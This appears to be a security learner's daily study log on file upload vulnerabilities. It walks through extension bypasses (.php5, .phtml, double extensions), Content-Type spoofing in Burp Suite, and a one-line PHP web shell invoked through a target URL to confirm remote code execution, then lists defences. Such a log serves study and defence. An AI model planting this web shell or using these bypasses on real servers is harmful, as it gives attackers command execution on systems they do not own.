## 🗓️ Day 33/100 – File Upload Vulnerabilities

**Focus:** Exploiting weak validation to upload malicious scripts (Web Shells).

### 📂 What is a File Upload Vulnerability?
It occurs when a web server allows users to upload files without sufficiently validating their name, type, contents, or size. This can lead to RCE (Remote Code Execution).

### ⚔️ Attack Techniques Practiced

**1. Extension Bypassing**
*   *Filter:* Server blocks `.php` files.
*   *Bypass:* Uploading as `.php5`, `.phtml`, or `.php.jpg` (Double Extension).

**2. Content-Type Spoofing**
*   *Filter:* Server checks `Content-Type` header.
*   *Bypass:* Intercepted request in Burp Suite and changed:
    `Content-Type: application/x-php` ➔ `Content-Type: image/jpeg`

**3. Web Shell Execution**
*   Uploaded a simple payload:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
*   Accessed via: `http://target.com/uploads/shell.php?cmd=ls`
*   *Result:* Server listed directory contents, confirming RCE.

### 🛡️ Defense Mechanisms
*   **Strict Allow-list:** Only allow specific extensions (e.g., `.jpg`, `.png`).
*   **Rename on Save:** Randomize filenames (`a1b2c3.jpg`) to prevent overwriting or guessing.
*   **Non-Executable Directories:** Ensure the upload folder does not have "Execute" permissions.

**Day 33 Takeaway:** File uploads are high-risk features. Without rigorous validation, they are essentially an open door for malware.
